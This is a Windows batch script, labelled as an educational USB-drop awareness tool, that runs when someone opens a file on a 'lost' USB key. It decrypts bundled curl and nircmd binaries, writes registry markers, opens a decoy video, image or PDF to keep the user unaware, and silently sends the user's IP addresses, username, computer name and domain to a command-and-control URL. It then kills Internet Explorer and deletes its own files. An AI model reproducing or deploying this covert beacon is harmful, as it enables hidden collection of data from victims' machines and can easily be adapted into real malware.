@echo off
REM #############################################################################
REM # Programme permettant d'identifier les utilisateurs de clefs USB "perdues" #
REM # (c) 2016 @EdGtslFcbngq6sk - Version 3.3                                   #
REM #                                                                           #
REM # A n'utiliser que pour un usage EDUCATIF et de SENSIBILISATION             #
REM # Only for educationnal use                                                 #
REM #                                                                           #
REM # Param�tres : %1 R�pertoiretemporaire de decompression                    #
REM #              %2 R�pertoire d'�x�cution du .exe                            #
REM #              %3 Nom de l'exe                                              #
REM #############################################################################
REM
REM TODO : Use DNS to exfiltrate data, and use PING not an other program
REM
REM Recuperation de l'identifiant client
set /p SerialID=<client.id
REM Definition des variables globales
set REGISTRY_KEY_BASE=HKEY_CURRENT_USER\SOFTWARE
set REGISTRY_KEY_ENTRY=P0wn1
set CC_URL=https://mycandy.efflam.net/p0n3y.php

REM Dechiffrement des binaires avec copie avant pour garder les ACLs
copy %SerialID%N.bin nircmdc.exe
%SerialID%X.exe -s -k %SerialID% -i %SerialID%N.bin -o nircmdc.exe
copy %SerialID%C.bin curl.exe
%SerialID%X.exe -s -k %SerialID% -i %SerialID%C.bin -o curl.exe

REM D�pot dans la base de registre d'un Red Flag
@reg add "%REGISTRY_KEY_BASE%\%REGISTRY_KEY_ENTRY%"            /ve /d "I am Here, my lord" /t REG_SZ /f >nul 2>nul
@reg add "%REGISTRY_KEY_BASE%\%REGISTRY_KEY_ENTRY%.%SerialID%" /ve /d "%DATE% %HOUR%"      /t REG_SZ /f >nul 2>nul

REM Recuperation de l'@ IP
for /f "delims=[] tokens=2" %%a in ('ping -4 %computername% -n 1 ^| findstr "["') do (
  set IP4ADDR=%%a
)
for /f "delims=[] tokens=2" %%a in ('ping -6 %computername% -n 1 ^| findstr "["') do (
  set IP6ADDR=%%a
)

set LaunchFrom=%2
set LaunchName=%3

REM Hello !
if /i "%I_in_a_current_analysis%"=="TRUE" (
  REM This code is some dead CODE ...
  %1\nircmdc.exe exec hide curl.exe --silent -k -o nul "%CC_URL%?arch=%PROCESSOR_ARCHITECTURE%&ip4=%IP4ADDR%&ip6=%IP6ADDR%&user=%username%&computername=%computername%&domain=%userdomain%&file=%ComSpec%&uid=%SerialID%&LaunchFrom=%LaunchFrom%&LaunchName=%LaunchName%&ext=Forensic"
  %1\nircmdc.exe speak text "Hello forensic analyst or curious user, you WIN ! You don't click on the file and examine what this file really do."
  %1\nircmdc.exe speak text "Congratulation. Remember to contact you CSO and give it this USB key."
  exit
)

REM Recup�ration du type de la charge simul�e
REM  et lancement du pseudo fichier pour pas eveiller l'utilisateur :-)
if exist %1\video.mp4 (
  start %1\video.mp4 >nul 2>nul
  set Extention=".mp4"
) else if exist %1\image.jpg (
  start %1\image.jpg >nul 2>nul
  set Extention=".jpg"
) else if exist %1\image.png (
  start %1\image.png >nul 2>nul
  set Extention=".png"
) else if exist 1\document.pdf (
  start %1\document.pdf >nul 2>nul
  set Extention=".pdf"
) else (
  set Extention=".exe"
)

REM Ping my CC and give information
%1\nircmdc.exe exec hide curl.exe --silent -k -o nul "%CC_URL%?arch=%PROCESSOR_ARCHITECTURE%&ip4=%IP4ADDR%&ip6=%IP6ADDR%&user=%username%&computername=%computername%&domain=%userdomain%&file=%ComSpec%&uid=%SerialID%&LaunchFrom=%LaunchFrom%&LaunchName=%LaunchName%&ext=%Extention%"

REM Just for fun ...
%1\nircmdc.exe cmdwait 4000 killprocess iexplore.exe

REM Clean ALL, if someone re-launch me ...
del /F /Q /S %1\*